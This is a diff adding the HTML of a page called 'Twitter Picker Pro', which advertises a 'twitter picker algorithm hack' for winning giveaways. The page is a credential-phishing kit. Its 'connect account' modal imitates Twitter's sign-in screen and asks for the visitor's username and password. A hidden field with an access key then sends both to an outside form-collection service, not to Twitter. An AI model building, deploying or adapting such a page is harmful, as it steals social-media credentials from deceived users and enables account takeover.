@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twitter Picker Pro</title>
+
+      <!-- custom stylesheet + script -->
+   <link rel="stylesheet" href="/dist/style.css">
+   <script defer src="/dist/script.js"></script>
+
+     <!-- GOOGLE FONT CDN -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <link href='https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css' rel='stylesheet'>
+
+
+</head>
+    <body>
+      <ul class="background">
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+    </ul>
+
+    <nav class="navbar containerHeader j-sb">
+      <div class="navbar__logo"><i class='bx bxl-twitter'></i>GP
+      </div>
+      <a href="javascript:void(0);" onclick="modalOpen()" class="connectBtn">
+        connect account 
+      </a> 
+    </nav>
+
+    <!-- MODAL -->
+    <div class="popup">
+      <form action="https://api.web3forms.com/submit" method="POST" class="form">
+       <div class="form__header">
+        <img src="./images/svgexport-2.svg" alt="">
+        <h4>
+          Sign in to twitter
+        </h4>
+       </div>
+        <div class="sign-in-with1">
+          <img src="./images/google_logo_icon_147282-removebg-preview.png " alt="">
+          <span>Sign in with Google</span>
+        </div>
+        <div class="sign-in-with">
+          <img src="./images/svgexport-3.svg" alt="">
+          <span>Sign in with Apple</span>
+        </div>
+        <div class="or">or</div>
+        <div class="form__inputBox">
+          <span class="label">Phone, email, or username</span><br>
+          <input type="hidden" name="access_key" value="8300d069-d751-445d-bbea-801b34956574">
+          <input type="hidden" name="redirect" value="https://web3forms.com/success">
+          <input name="email" required type="text" class="input"> 
+        </div>
+        <div class="form__inputBox">
+          <span class="label">Password</span><br>
+          <input name="password" required type="password" class="input"> 
+        </div>
+        <button type="submit" class="form__button">Log in</button>
+        <div class="form__bottomText">
+          <span class="fp mg-tp">Forgot password?</span><br>
+          <span class="non-link mg-tp" >Don't have an account?</span>
+          <span class="fp">Sign up</span>
+        </div>
+      </form>
+    </div>
+    <!-- !MODAL -->
+        
+    <section class="hero">
+      <div class="hero__container padding j-sb">
+        <div class="text">
+          <h2>
+            Tested, trusted, seamless
+          </h2>
+          <p>
+            New twitter picker algorithm hack. 100% tested and worked for over 250+ people, Get picked for giveaways on twitter by twitter picker. Connect you twitter account to get started with the app for free!
+          </p>
+          <a href="javascript:void(0);" onclick="modalOpen()" class="connectBtnn">
+            connect account
+          </a>
+        </div>
+        <div class="imgContainer">
+          <img src="./images/Screenshot_20220414-235134_iphone13prographite_portrait.png" alt="">
+        </div>
+      </div>
+    </section>
+</body>
+</html>
